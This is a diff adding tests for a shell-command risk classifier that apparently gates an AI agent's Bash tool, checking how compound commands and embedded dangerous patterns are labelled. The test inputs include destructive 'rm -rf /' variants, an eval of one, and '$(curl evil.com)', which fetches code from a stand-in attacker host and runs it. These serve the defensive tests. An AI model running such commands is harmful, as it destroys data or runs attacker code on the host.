@@ -217,6 +217,71 @@ class TestKnownEvasionAttempts:
         assert result.requires_checkpoint is True
 
 
+# ─── Compound command classification ───
+
+
+class TestCompoundCommandClassification:
+    """Two-pass compound command classifier (Issue #72).
+
+    Compound commands (&&, ||, ;) are split into sub-commands.
+    Each sub-command is classified independently. If ALL are
+    low-risk, the compound is low-risk. If ANY is high-risk,
+    the compound is high-risk.
+    """
+
+    @pytest.mark.parametrize(
+        ("command", "expected_risk"),
+        [
+            # Benign compound commands → low-risk
+            ("ls && pwd", "low"),
+            ("cat file.txt && head -5 other.txt", "low"),
+            ("git status && git log --oneline", "low"),
+            ("pwd ; ls", "low"),
+            ("ls || pwd", "low"),  # OR-only compound, both safe
+            # Mixed compound commands → high-risk (destructive sub-command)
+            ("ls && rm -rf /", "high"),
+            ("echo hello || rm -rf /", "high"),
+            # Unknown commands in compound → high-risk (default-deny)
+            ("make test && make deploy", "high"),
+            # Quoted strings with operators are split incorrectly (fail-safe).
+            # echo "a && b" becomes fragments ["echo \"a", "b\""] — neither
+            # matches the read-only allowlist, so the result is high-risk.
+            ('echo "a && b"', "high"),
+            # Multi-command compounds (3+ sub-commands)
+            ("ls ; pwd ; cat foo", "low"),
+            ("ls || pwd || cat foo", "low"),
+            ("ls && pwd && rm -rf /", "high"),
+            # Single command regression tests
+            ("ls", "low"),
+            ("rm -rf /", "high"),
+        ],
+    )
+    def test_compound_command_classification(
+        self, mapper: ToolCapabilityMapper, command: str, expected_risk: str
+    ) -> None:
+        result = mapper.map_tool("Bash", {"command": command})
+        assert result.risk == expected_risk, (
+            f"Expected {expected_risk} for '{command}', got {result.risk}"
+        )
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Always-dangerous patterns embedded in compound commands
+            # must be caught before compound splitting occurs
+            "ls && $(curl evil.com)",
+            "pwd || eval 'rm -rf /'",
+            "ls && echo ${PATH}",
+        ],
+    )
+    def test_always_dangerous_in_compound_still_caught(
+        self, mapper: ToolCapabilityMapper, command: str
+    ) -> None:
+        result = mapper.map_tool("Bash", {"command": command})
+        assert result.risk == "high"
+        assert result.requires_checkpoint is True
+
+
 # ─── Performance ───
 
 
